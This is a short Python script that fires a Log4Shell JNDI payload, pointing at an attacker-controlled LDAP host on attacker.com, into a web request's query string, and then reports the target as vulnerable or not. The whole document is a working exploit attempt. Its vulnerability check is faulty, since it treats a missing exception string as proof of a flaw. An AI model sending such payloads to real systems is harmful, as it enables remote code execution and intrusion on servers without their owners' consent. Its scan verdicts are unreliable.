import requests

url = "https://example.com"  
payload = "${jndi:ldap://attacker.com:1389/Exploit}"  
headers = {"User-Agent": "google"}

response = requests.get(url, headers=headers, params={"q": payload})

if "javax.naming.NameNotFoundException" in response.text:
    print("Log4j vulnerability not found")
else:
    print("Log4j vulnerability found")
